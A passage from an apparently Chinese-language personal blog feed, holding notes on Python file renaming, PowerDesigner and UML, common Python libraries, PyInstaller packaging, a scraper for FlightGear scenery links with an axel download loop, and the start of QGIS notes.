<li><a href="https://www.dotohi.com/python/pip%20set%20proxy.html" target="_blank" rel="noopener">1. 让PIP源使用国内镜像，提升下载速度和安装成功率。</a>,by dotohi.</li>
<li><a href="https://pip.pypa.io/en/stable/user_guide/" target="_blank" rel="noopener">pip install –proxy</a>,by pip homepage.</li>
<li><a href="https://zhuanlan.zhihu.com/p/276461821" target="_blank" rel="noopener">花了两天，终于把 Python 的 setup.py 给整明白了</a>,by 王炳明.</li>
<li><a href="https://blog.csdn.net/m0_37469948/article/details/106188587" target="_blank" rel="noopener">pyenv install build failed:Fatal: You must get working getaddrinfo() function.</a>,by Honcy Ye.</li>
<li><a href="https://vra.github.io/2021/01/03/venv-intro/" target="_blank" rel="noopener">python虚拟环境管理工具venv教程</a>,by Yunfeng.</li>
<li><a href="https://www.jianshu.com/p/69681655309b" target="_blank" rel="noopener">Python3.7.0以上版本安装pip报错ModuleNotFoundError: No module named ‘_ctypes’解决方法</a>,by bro丶默默.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python批量重命名文件</title>
    <url>/2019/01/01/Python%E6%89%B9%E9%87%8F%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>最近从iData中下载了很多学术论文，这些论文文件名都以“<a href="http://www.cn-ki.net_”开头，一个个重命名太麻烦，于是使用如下python3脚本批量重命名文件。" target="_blank" rel="noopener">www.cn-ki.net_”开头，一个个重命名太麻烦，于是使用如下python3脚本批量重命名文件。</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Python3 code to rename multiple  </span><br><span class="line"># files in a directory or folder </span><br><span class="line">  </span><br><span class="line"># importing os module </span><br><span class="line">import os </span><br><span class="line">  </span><br><span class="line"># Function to rename multiple files </span><br><span class="line">def main(): </span><br><span class="line"></span><br><span class="line">    # search file in current directory  </span><br><span class="line">    for filename in os.listdir(&quot;.&quot;): </span><br><span class="line"></span><br><span class="line">        if os.path.isfile(filename):</span><br><span class="line">            if &quot;www.cn-ki.net_&quot; in filename[0:14]:</span><br><span class="line">                src&#x3D;filename</span><br><span class="line">                dst&#x3D;filename[14:]</span><br><span class="line">                # rename the special file</span><br><span class="line">                os.rename(src, dst)</span><br><span class="line">  </span><br><span class="line"># Driver Code </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;: </span><br><span class="line">      </span><br><span class="line">    # Calling main() function </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://linuxhint.com/sort-lambda-python/" target="_blank" rel="noopener">How to sort with lambda in Python</a>,by linuxhint.</li>
<li><a href="https://zhuanlan.zhihu.com/p/35725217" target="_blank" rel="noopener">用Python复制文件的9个方法</a>,by 景略集智.</li>
<li><a href="https://docs.python.org/zh-cn/3/library/shutil.html" target="_blank" rel="noopener">shutil — 高阶文件操作</a>,by python.</li>
<li><a href="https://blog.csdn.net/mantoureganmian/article/details/47949101" target="_blank" rel="noopener">python glob.glob使用</a>,by mantoureganmian.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>PowerDesigner使用经验总结</title>
    <url>/2018/05/09/PowerDesigner%E4%BD%BF%E7%94%A8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><p>在系统工程及软件工程中，需求分析指的是在创建一个新的或改变一个现存的系统或产品时，确定新系统的目的、范围、定义和功能时所要做的所有工作。需求分析是软件工程中的一个关键过程。在这个过程中，系统分析员和软件工程师确定顾客的需要。只有在确定了这些需要后他们才能够分析和寻求新系统的解决方法。 </p>
<p>在软件工程的历史中，很长时间里人们一直认为需求分析是整个软件工程中最简单的一个步骤，但在过去十年中越来越多的人认识到它是整个过程中最关键的一个过程。假如在需求分析时，分析者们未能正确地认识到顾客的需要的话，那么最后的软件实际上不可能达到顾客的需要，或者软体无法在规定的时间里完工。 </p>
<h1 id="软件设计"><a href="#软件设计" class="headerlink" title="软件设计"></a>软件设计</h1><p>软件设计是从软件需求规格说明书出发，根据需求分析阶段确定的功能设计软件系统的整体结构、划分功能模块、确定每个模块的实现算法以及编写具体的代码，形成软件的具体设计方案。</p>
<p>软件设计是把许多事物和问题抽象起来，并且抽象它们不同的层次和角度。将问题或事物分解并模块化使得解决问题变得容易，分解的越细模块数量也就越多，它的副作用就是使得设计者考虑更多的模块之间耦合度的情况。</p>
<h1 id="UML"><a href="#UML" class="headerlink" title="UML"></a>UML</h1><p>统一建模语言（英语：Unified Modeling Language，缩写UML）是一种开放的方法，用于说明、可视化、构建和编写一个正在开发的、面向对象的、软件密集系统的制品的开放方法。UML展现了一系列最佳工程实践，这些最佳实践在对大规模，复杂系统进行建模方面，特别是在软件架构层次已经被验证有效。</p>
<p>这个语言由葛来迪·布区，伊瓦尔·雅各布森与詹姆士·兰宝于1994年至1995年间，在Rational Software公司中开发，于1996年，又进一步发展。UML集成了Booch，OMT和面向对象软件工程的概念，将这些方法融合为单一的，通用的，并且可以广泛使用的建模语言。UML打算成为可以对并发和分布式系统的标准建模语言。</p>
<p>在UML系统开发中有三个主要的模型：</p>
<ul>
<li>功能模型：从用户的角度展示系统的功能，包括用例图。</li>
<li>静态模型：采用对象，属性，操作，关联等概念展示系统的结构和基础，包括类别图、对象图。</li>
<li>动态模型：展现系统的内部行为。包括序列图，活动图，状态图。）</li>
</ul>
<h1 id="PowerDesigner工具"><a href="#PowerDesigner工具" class="headerlink" title="PowerDesigner工具"></a>PowerDesigner工具</h1><p>PowerDesigner是Sybase的企业建模和设计解决方案，采用模型驱动方法，将业务与IT结合起来，可帮助部署有效的企业体系架构，并为研发生命周期管理提供强大的分析与设计技术。</p>
<p>PowerDesigner独具匠心地将多种标准数据建模技术（UML、业务流程建模以及市场领先的数据建模）集成一体，并与 .NET、WorkSpace、PowerBuilder、Java™、Eclipse 等主流开发平台集成起来，从而为传统的软件开发周期管理提供业务分析和规范的数据库设计解决方案。此外，它支持60多种关系数据库管理系统（RDBMS）／版本[来源请求]。PowerDesigner运行在Microsoft Windows平台上，并提供了Eclipse插件。</p>
<h1 id="PowerDesigner使用经验"><a href="#PowerDesigner使用经验" class="headerlink" title="PowerDesigner使用经验"></a>PowerDesigner使用经验</h1><p>遵循UML方法，使用PowerDesigner对系统进行建模。</p>
<p>在需求分析阶段，通常使用用例图、序列图（序列图中主要描述用户与系统之间交互关系）、组合结构图、类图（用于描述组件或类的接口及其调用关系）等UML图描述。</p>
<p>在设计阶段，从架构设计、概要设计到详细设计，粒度由粗到细。</p>
<p>通常架构设计是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计。<br>架构设计通常使用组织结构图、对象图、活动图、状态图等UML图描述。</p>
<p>概要设计就是设计软件的结构，包括组成模块，模块的层次结构，模块的调用关系，每个模块的功能等等。同时，还要设计该项目的应用系统的总体数据结构和数据库结构，即应用系统要存储什么数据，这些数据是什么样的结构，它们之间有什么关系。概要设计从模块角度描述系统，通常使用组合结构图进行描述。</p>
<p>详细设计就是为每个模块完成的功能进行具体的描述，要把功能描述转变为精确的、结构化的过程描述。如采用面向对象的开发方法，详细设计通常使用UML类图描述。</p>
<h2 id="状态图绘制"><a href="#状态图绘制" class="headerlink" title="状态图绘制"></a>状态图绘制</h2><p>请参考<a href="https://www.cnblogs.com/zsg88/p/7636415.html" target="_blank" rel="noopener">PowerDesigner16 状态图</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BB%9F%E4%B8%80%E5%BB%BA%E6%A8%A1%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener">统一建模语言</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/write6/article/details/109331082" target="_blank" rel="noopener">Power Designer 概念数据模型导出 逻辑数据模型和物理数据模型 生成数据库脚本</a>,by 子澈课堂.</li>
<li><a href="https://developer.aliyun.com/article/314587" target="_blank" rel="noopener">PowerDesigner使用教程</a>,by 芝麻软件.</li>
<li><a href="https://www.onlinedown.net/article/10006859.htm" target="_blank" rel="noopener">PowerDesigner使用教程-使用PowerDesigner创建应用架构图的</a>,by 常山造纸农.</li>
<li><a href="https://blog.51cto.com/xiaowangshushu/5316670" target="_blank" rel="noopener">PowerDesigner使用</a>,by 写程序的小王叔叔.</li>
<li><a href="https://www.cnblogs.com/zsg88/p/7636415.html" target="_blank" rel="noopener">PowerDesigner16 状态图</a>,by 猪脚踏浪.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Python常用库简介</title>
    <url>/2018/10/14/Python%E5%B8%B8%E7%94%A8%E5%BA%93%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Python的高效开发建立在大量常用库基础上，因此掌握常用的Python库十分必要。下面简单介绍Python的各类常用库。</p>
<h1 id="常用标准库"><a href="#常用标准库" class="headerlink" title="常用标准库"></a>常用标准库</h1><ul>
<li>os： 访问操作系统功能模块</li>
<li>sys： 访问一些环境变量和与 Python 解释器交互</li>
<li>datetime： 日期时间处理</li>
<li>collections： 高级数据结构，有序字典，队列等等</li>
<li>uuid： 生成 UUID 模块</li>
<li>random： 随机数生成模块</li>
<li>re： 正则表达式模块</li>
<li>json： JSON 处理模块</li>
<li>pdb： 单步调试模块</li>
</ul>
<h1 id="科学计算"><a href="#科学计算" class="headerlink" title="科学计算"></a>科学计算</h1><ul>
<li>scipy：基于Python的matlab实现，旨在实现matlab的所有功能。包含Numpy、Ipython、Pandas、Matplotlib、Sympy等常用库</li>
<li>numpy： 基于Python的科学计算第三方库，提供了矩阵，线性代数，傅立叶变换等等的解决方案</li>
<li>pandas： 支持表格等多维数据</li>
<li>matplotlib： 用Python实现的类matlab的第三方库，用以绘制一些高质量的数学二维图形</li>
</ul>
<h1 id="命令交互"><a href="#命令交互" class="headerlink" title="命令交互"></a>命令交互</h1><ul>
<li>ipython： 交互命令行，适合科学计算</li>
<li>jupyter： ipython notebook 的延伸，可以直接放在github上</li>
<li>argparse：(Python 标准库)用于命令项选项与参数解析的模块</li>
</ul>
<h1 id="爬虫相关"><a href="#爬虫相关" class="headerlink" title="爬虫相关"></a>爬虫相关</h1><ul>
<li>urllib: (Python 标准库)，接受URL请求的相关模块</li>
<li>http: (Python 标准库)，处理所有客户端–服务器http请求的具体细节</li>
<li>requests: 第三方库，人性化的HTTP请求库，比urllib更好用</li>
<li>pillow: 处理验证码</li>
<li>rsa: 处理加密问题</li>
<li>BeautifulSoup：解析html文档为用户提供需要抓取的数据</li>
<li>lxml: 是基于 libxml2 这一 XML 解析库的 Python 封装,解析速度比 Beautiful Soup 更快</li>
</ul>
<h1 id="环境管理"><a href="#环境管理" class="headerlink" title="环境管理"></a>环境管理</h1><ul>
<li>virtualenv：创建独立 Python 环境的工具</li>
<li>virtualenvwrapper：virtualenv 的一组扩展</li>
</ul>
<h1 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h1><ul>
<li>pip：Python 包和依赖关系管理工具</li>
<li>conda：跨平台，Python 二进制包管理工具</li>
</ul>
<h1 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h1><ul>
<li>threading：(Python 标准库)更高层的线程接口</li>
<li>multiprocessing：(Python 标准库) 基于进程的“线程”接口</li>
</ul>
<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><ul>
<li>logging：(Python 标准库) 为 Python 提供日志功能。</li>
</ul>
<h1 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h1><ul>
<li>six：Python 2 和 3 的兼容性工具</li>
</ul>
<h1 id="计算机视觉"><a href="#计算机视觉" class="headerlink" title="计算机视觉"></a>计算机视觉</h1><ul>
<li>opencv</li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li>tensorflow</li>
</ul>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://www.jianshu.com/p/886cbabbfe9e" target="_blank" rel="noopener">Python 笔记四：Python的常用库收集</a>, by brandonxiang </li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python程序打包成exe</title>
    <url>/2019/06/29/Python%E7%A8%8B%E5%BA%8F%E6%89%93%E5%8C%85%E6%88%90exe/</url>
    <content><![CDATA[<p>大部分人是普通人，不知道如何运行Python脚本程序，因此有必要将Python脚本程序打包成可执行文件，免去安装Python环境，提高Python脚本程序的可用性。</p>
<h1 id="打包方法"><a href="#打包方法" class="headerlink" title="打包方法"></a>打包方法</h1><p>Python脚本程序的发布有三种方法：</p>
<ul>
<li>.py文件：对于开源项目或者源码没那么重要的，直接提供源码，需要使用者自行安装Python并且安装依赖的各种库。</li>
<li>.pyc文件：有些公司或个人因为机密或者各种原因，不愿意源码被运行者看到，可以使用pyc文件发布，pyc文件是Python解释器可以识别的二进制码，故发布后也是跨平台的，需要使用者安装相应版本的Python和依赖库。</li>
<li>可执行文件：对于非码农用户，最简单的方式就是提供一个可执行文件，只需要把用法告诉他即可。比较麻烦的是需要针对不同平台需要打包不同的可执行文件（Windows, Linux, Mac,…）。</li>
</ul>
<p>下面介绍将Python脚本程序打包成可执行程序的各种工具。</p>
<center>表1 各种打包工具的对比</center>

<table>
<thead>
<tr>
<th>Solution</th>
<th>Windows</th>
<th>Linux</th>
<th>OS X</th>
<th>Python 3</th>
<th>One file mode</th>
<th>Zipfile import</th>
<th>Eggs</th>
<th>pkg_resources support</th>
</tr>
</thead>
<tbody><tr>
<td>bbFreeze</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
<td>no</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td>py2exe</td>
<td>yes</td>
<td>no</td>
<td>no</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td>pyInstaller</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
<td>yes</td>
<td>no</td>
</tr>
<tr>
<td>cx_Freeze</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
</tr>
<tr>
<td>py2app</td>
<td>no</td>
<td>no</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
</tbody></table>
<p>从上述对Python脚本程序打包工具对比可知，推荐使用pyInstaller。</p>
<h1 id="PyInstaller打包示例"><a href="#PyInstaller打包示例" class="headerlink" title="PyInstaller打包示例"></a>PyInstaller打包示例</h1><h2 id="安装PyInstaller"><a href="#安装PyInstaller" class="headerlink" title="安装PyInstaller"></a>安装PyInstaller</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure>

<h2 id="打包Python脚本"><a href="#打包Python脚本" class="headerlink" title="打包Python脚本"></a>打包Python脚本</h2><p>打包Python脚本成单独的 .exe 文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pyinstaller -F yourprogram.py</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/45288707" target="_blank" rel="noopener">如何将 Python 程序打包成 .exe 文件？</a>,by 刘哈哈.</li>
<li><a href="https://blog.csdn.net/zengxiantao1994/article/details/76578421" target="_blank" rel="noopener">Python程序打包成exe可执行文件</a>,by 知行流浪.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>QT5.12搭建Android开发环境</title>
    <url>/2022/07/27/QT5%E6%90%AD%E5%BB%BAAndroid%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/MakeView660/p/11206268.html" target="_blank" rel="noopener">Qt for Android环境搭建</a>,by 我来乔23.</li>
<li><a href="https://www.eet-china.com/mp/a47680.html" target="_blank" rel="noopener">不会Java？没关系，用C/C++搞定安卓APP！Qt for Android开发！</a>,by 嵌入式ARM.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫获取网页链接</title>
    <url>/2019/03/13/Python%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96%E7%BD%91%E9%A1%B5%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<p>最近研究开源飞行模拟器，想将其世界地景全部下载下来。一个个手动下载太麻烦，于是想先用python的requests和Beautiful Soup组件获取地景链接，再以每行一个地景链接写入文本文档，最后使用axel多线程自动下载每一个地景包。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="requests组件"><a href="#requests组件" class="headerlink" title="requests组件"></a>requests组件</h2><p>Requests是一个Python HTTP库，在Apache 2许可证下发布。该项目的目标是使HTTP请求更简单，更人性化。</p>
<p>下面是示例代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;api.github.com&#x2F;user&#39;, auth&#x3D;(&#39;user&#39;, &#39;pass&#39;))</span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span class="line">200</span><br><span class="line">&gt;&gt;&gt; r.headers[&#39;content-type&#39;]</span><br><span class="line">&#39;application&#x2F;json; charset&#x3D;utf8&#39;</span><br><span class="line">&gt;&gt;&gt; r.encoding</span><br><span class="line">&#39;utf-8&#39;</span><br><span class="line">&gt;&gt;&gt; r.text # doctest: +ELLIPSIS</span><br><span class="line">u&#39;&#123;&quot;type&quot;:&quot;User&quot;...&#39;</span><br><span class="line">&gt;&gt;&gt; r.json() # doctest: +ELLIPSIS</span><br><span class="line">&#123;u&#39;private_gists&#39;: 419, u&#39;total_private_repos&#39;: 77, ...&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Beautiful-Soup组件"><a href="#Beautiful-Soup组件" class="headerlink" title="Beautiful Soup组件"></a>Beautiful Soup组件</h2><p>Beautiful Soup 是一个可以从HTML或XML文件中提取数据的Python库。它能够通过你喜欢的转换器实现惯用的文档导航，查找，修改文档的方式。Beautiful Soup会帮你节省数小时甚至数天的工作时间。</p>
<p>Beautiful Soup支持Python标准库中的HTML解析器，还支持一些第三方的解析器，其中一个是 lxml。</p>
<p>Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: Tag , NavigableString , BeautifulSoup , Comment。</p>
<ul>
<li>Tag 对象与XML或HTML原生文档中的tag相同，有最重要的属性: name和attributes。</li>
<li>BeautifulSoup 对象表示的是一个文档的全部内容，但并不是真正的HTML或XML的tag，所以它没有name和attribute属性。</li>
<li>Beautiful Soup用 NavigableString 类来包装tag中的字符串。</li>
<li>Comment 对象是一个特殊类型的 NavigableString 对象:</li>
</ul>
<p>下面是BeautifulSoup的一个简单示例。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup &#x3D; BeautifulSoup(html_doc)</span><br><span class="line"></span><br><span class="line">print(soup.prettify())</span><br><span class="line"># &lt;html&gt;</span><br><span class="line">#  &lt;head&gt;</span><br><span class="line">#   &lt;title&gt;</span><br><span class="line">#    The Dormouse&#39;s story</span><br><span class="line">#   &lt;&#x2F;title&gt;</span><br><span class="line">#  &lt;&#x2F;head&gt;</span><br><span class="line">#  &lt;body&gt;</span><br><span class="line">#   &lt;p class&#x3D;&quot;title&quot;&gt;</span><br><span class="line">#    &lt;b&gt;</span><br><span class="line">#     The Dormouse&#39;s story</span><br><span class="line">#    &lt;&#x2F;b&gt;</span><br><span class="line">#   &lt;&#x2F;p&gt;</span><br><span class="line">#   &lt;p class&#x3D;&quot;story&quot;&gt;</span><br><span class="line">#    Once upon a time there were three little sisters; and their names were</span><br><span class="line">#    &lt;a class&#x3D;&quot;sister&quot; href&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;elsie&quot; id&#x3D;&quot;link1&quot;&gt;</span><br><span class="line">#     Elsie</span><br><span class="line">#    &lt;&#x2F;a&gt;</span><br><span class="line">#    ,</span><br><span class="line">#    &lt;a class&#x3D;&quot;sister&quot; href&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;lacie&quot; id&#x3D;&quot;link2&quot;&gt;</span><br><span class="line">#     Lacie</span><br><span class="line">#    &lt;&#x2F;a&gt;</span><br><span class="line">#    and</span><br><span class="line">#    &lt;a class&#x3D;&quot;sister&quot; href&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;tillie&quot; id&#x3D;&quot;link2&quot;&gt;</span><br><span class="line">#     Tillie</span><br><span class="line">#    &lt;&#x2F;a&gt;</span><br><span class="line">#    ; and they lived at the bottom of a well.</span><br><span class="line">#   &lt;&#x2F;p&gt;</span><br><span class="line">#   &lt;p class&#x3D;&quot;story&quot;&gt;</span><br><span class="line">#    ...</span><br><span class="line">#   &lt;&#x2F;p&gt;</span><br><span class="line">#  &lt;&#x2F;body&gt;</span><br><span class="line"># &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="axel工具"><a href="#axel工具" class="headerlink" title="axel工具"></a>axel工具</h2><p>axel是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。</p>
<p>axel语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">axel [options] url1 [url2] [url...]</span><br></pre></td></tr></table></figure>

<p>axel选项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--max-speed&#x3D;x , -s x         最高速度x</span><br><span class="line">--num-connections&#x3D;x , -n x   连接数x</span><br><span class="line">--output&#x3D;f , -o f            下载为本地文件f</span><br><span class="line">--search[&#x3D;x] , -S [x]        搜索镜像</span><br><span class="line">--header&#x3D;x , -H x            添加头文件字符串x（指定 HTTP header）</span><br><span class="line">--user-agent&#x3D;x , -U x        设置用户代理（指定 HTTP user agent）</span><br><span class="line">--no-proxy ， -N             不使用代理服务器</span><br><span class="line">--quiet ， -q                静默模式</span><br><span class="line">--verbose ，-v               更多状态信息</span><br><span class="line">--alternate ， -a            Alternate progress indicator</span><br><span class="line">--help ，-h                  帮助</span><br><span class="line">--version ，-V               版本信息</span><br></pre></td></tr></table></figure>


<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><h2 id="获取地景链接"><a href="#获取地景链接" class="headerlink" title="获取地景链接"></a>获取地景链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 下载指定URI链接</span><br><span class="line">def getUriContent(uri):</span><br><span class="line">    try:</span><br><span class="line">        fgWorldScenery &#x3D; requests.get(link, timeout&#x3D;10)</span><br><span class="line">    except requests.exceptions.HTTPError as errh:</span><br><span class="line">        print (&quot;Http Error:&quot;,errh)</span><br><span class="line">    except requests.exceptions.ConnectionError as errc:</span><br><span class="line">        print (&quot;Error Connecting:&quot;,errc)</span><br><span class="line">    except requests.exceptions.Timeout as errt:</span><br><span class="line">        print (&quot;Timeout Error:&quot;,errt)  </span><br><span class="line">    except requests.exceptions.RequestException as err:</span><br><span class="line">        print (&quot;OOps: Something Else&quot;,err)</span><br><span class="line">    else:    </span><br><span class="line">        print(&quot;Http Request Success!&quot;)</span><br><span class="line">        return fgWorldScenery.text</span><br><span class="line"></span><br><span class="line"># 获取所有地景链接，存入列表</span><br><span class="line">def getTargetLinks(html):</span><br><span class="line">    soup &#x3D; BeautifulSoup(html)</span><br><span class="line">    list&#x3D;[]</span><br><span class="line">    #print(soup.prettify())</span><br><span class="line">    for child in soup.find_all(&#39;area&#39;):</span><br><span class="line">        list.append(child[&#39;href&#39;])</span><br><span class="line">    print(&quot;Get Target Links Success!&quot;)</span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line"># 将地景链接逐行写入文件</span><br><span class="line">def writeToFile(linkList):</span><br><span class="line">    file &#x3D; open(&#39;.&#x2F;sceneLink.txt&#39;,&#39;w&#39;)</span><br><span class="line">    for link in linkList:</span><br><span class="line">        file.write(link)</span><br><span class="line">        file.write(&#39;\t\n&#39;)</span><br><span class="line">    print(&quot;Write Target Link To File Success!&quot;)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    link &#x3D; &quot;http:&#x2F;&#x2F;www.flightgear.org&#x2F;legacy-Downloads&#x2F;scenery-v2.12.html&quot;</span><br><span class="line">    html&#x3D;getUriContent(link)</span><br><span class="line">    linkList&#x3D;getTargetLinks(html)</span><br><span class="line">    writeToFile(linkList)</span><br></pre></td></tr></table></figure>

<h2 id="下载世界地景"><a href="#下载世界地景" class="headerlink" title="下载世界地景"></a>下载世界地景</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for line in $(cat sceneLink.txt)</span><br><span class="line">do </span><br><span class="line">    axel -n 10 $line</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">requests快速上手</a>,by requests.</li>
<li><a href="http://www.runoob.com/python/python-tutorial.html" target="_blank" rel="noopener">Python 基础教程</a>, by runoob.</li>
<li><a href="http://codingpy.com/article/guido-shows-how-to-write-main-function/" target="_blank" rel="noopener">Python之父教你写main()函数</a>,by 编程派.</li>
<li><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="noopener">Beautiful Soup 4.2.0 文档</a>,by BeautifulSoup.</li>
<li><a href="https://huangwang.github.io/2019/03/13/FlightGear安装飞机和场景的方法/">FlightGear安装飞机和场景的方法</a>,by jack huang.</li>
<li><a href="http://man.linuxde.net/axel" target="_blank" rel="noopener">axel命令</a>,by Linux命令大全.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>QGIS学习笔记</title>
    <url>/2023/01/20/QGIS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>最近在研究学习QGIS，简单记一下笔记。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>地理信息系统（Geographic Informaiton System，GIS）是一个可以建立、浏览、查询、分析地理空间数据的软件系统， 其功能小至地图的展示，大至空间决策分析与支持。</p>
<h1 id="目前常见的GIS软件"><a href="#目前常见的GIS软件" class="headerlink" title="目前常见的GIS软件"></a>目前常见的GIS软件</h1><p>自由软件或免费软件：</p>
<ul>
<li>Quantum GIS（QGIS） <a href="http://www.qgis.org/" target="_blank" rel="noopener">http://www.qgis.org/</a></li>
<li>Geographic Resources Analysis Support System（GRASS） <a href="http://grass.itc.it/" target="_blank" rel="noopener">http://grass.itc.it/</a></li>
<li>PostGIS： <a href="http://postgis.refractions.net" target="_blank" rel="noopener">http://postgis.refractions.net</a></li>
<li>Thuban： <a href="http://thuban.intevation.org/index.html" target="_blank" rel="noopener">http://thuban.intevation.org/index.html</a></li>
<li>OpenEV： <a href="http://openev.sourceforge.net/" target="_blank" rel="noopener">http://openev.sourceforge.net/</a></li>
<li>GMT： <a href="http://gmt.soest.hawaii.edu/" target="_blank" rel="noopener">http://gmt.soest.hawaii.edu/</a></li>
</ul>
<p>商业软件：</p>
<ul>
<li>ArcGIS（ArcInfo, ArcViw） <a href="http://www.esri.com" target="_blank" rel="noopener">http://www.esri.com</a></li>
<li>MapInfo Coporation： <a href="http://www.mapinfo.com" target="_blank" rel="noopener">http://www.mapinfo.com</a></li>
<li>Autodesk Inc： AutoCAD Maphttp <a href="https://www.autodesk.com.cn/" target="_blank" rel="noopener">https://www.autodesk.com.cn/</a></li>
<li>Web应用/APP：GeoMedia <a href="http://www.intergraph.com/" target="_blank" rel="noopener">http://www.intergraph.com/</a></li>
<li>Google Earth / Google Map：</li>
</ul>
<p>提供全世界范围的卫星影像（含历史卫星影像）、地图、地形图、道路、3D建筑物，使用者可以任意探索世界各地的 地理信息，储存浏览过的地方，做有系统的规划与管理。历史卫星影像可供用户询区域性的时序变迁； 另外，也整合海底与水面研究数据，提供地球环境全方位的资料。</p>
<h1 id="QGIS安装"><a href="#QGIS安装" class="headerlink" title="QGIS安装"></a>QGIS安装</h1><p>Quantum GIS（QGIS）是开源地理信息系统桌面软件，使用GNU（General Public License）授权， 属于 Open Source eospatial Foundation（OSGeo）的官方计划。</p>
